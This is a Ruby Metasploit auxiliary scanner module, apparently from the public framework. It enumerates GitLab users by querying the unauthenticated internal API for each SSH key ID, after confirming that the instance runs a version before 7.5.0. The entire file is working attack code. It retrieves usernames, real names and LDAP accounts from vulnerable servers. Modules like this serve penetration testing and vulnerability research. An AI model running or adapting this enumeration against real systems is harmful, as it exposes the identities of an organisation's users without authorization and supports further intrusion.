##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'
require 'msf/core'
require 'json'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(
      info,
      'Name'        => 'Gitlab User Enumeration',
      'Description' => "
        The Gitlab 'internal' API is exposed unauthenticated on Gitlab. This
        allows the username for each SSH Key ID number to be retrieved. Users
        who do not have an SSH Key cannot be enumerated in this fashion. LDAP
        users, e.g. Active Directory users will also be returned.
        This issue was fixed in Gitlab v7.5.0.
      ",
      'Author'      => 'Ben Campbell',
      'License'     => MSF_LICENSE,
      'DisclosureDate' => 'Oct 15 2014',
      'References'     =>
        [
          [ 'URL', 'https://labs.mwrinfosecurity.com/tools/' ]
        ]
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'Path to Gitlab instance', '/']),
        OptInt.new('START_ID', [true, 'ID number to start from', 0]),
        OptInt.new('END_ID', [true, 'ID number to enumerate up to', 50])
      ], self.class)
  end

  def run_host(_ip)
    api = '/api/v3'
    internal_api = "#{api}/internal"
    check = normalize_uri(target_uri.path, internal_api, 'check')

    print_status('Sending gitlab version request...')
    res = send_request_cgi(
        'uri' => check
    )

    if res && res.code == 200 && res.body
      version = JSON.parse(res.body)
      git_version = version['gitlab_version']
      git_revision = version['gitlab_rev']
      print_good("GitLab version: #{git_version} revision: #{git_revision}")

      report_service(
        host: rhost,
        port: rport,
        name: (ssl ? 'https' : 'http'),
        proto: 'tcp'
      )

      report_web_site(
        host: rhost,
        port: rport,
        ssl: ssl,
        info: "Gitlab Version - #{git_version}"
      )
    else
      fail_with(Failure::Unknown, 'Unable to retrieve Gitlab version...')
    end

    major, minor, _ = git_version.split('.')

    if major.to_i > 7
      fail_with(Failure::NotVulnerable, "Version #{git_version} is not vulnerable.")
    else
      if major.to_i == 7 && minor.to_i >= 5
        fail_with(Failure::NotVulnerable, "Version #{git_version} is not vulnerable.")
      end
    end

    discover = normalize_uri(target_uri.path, internal_api, 'discover')

    print_status("Enumerating user keys #{datastore['START_ID']}-#{datastore['END_ID']}...")
    datastore['START_ID'].upto(datastore['END_ID']) do |id|
      res = send_request_cgi(
          'uri'       => discover,
          'method'    => 'GET',
          'vars_get'  => { 'key_id' => id }
        )

      if res && res.code == 200 &&  res.body
        begin
          user = JSON.parse(res.body)
          print_good("Key-ID: #{id} Username: #{user['username']} Name: #{user['name']}")
        rescue JSON::ParserError
          print_error("Key-ID: #{id} - Unexpected response body: #{res.body}")
        end
      elsif res
        vprint_status("Key-ID: #{id} not found")
      else
        print_error('Connection timed out...')
      end
    end
  end
end

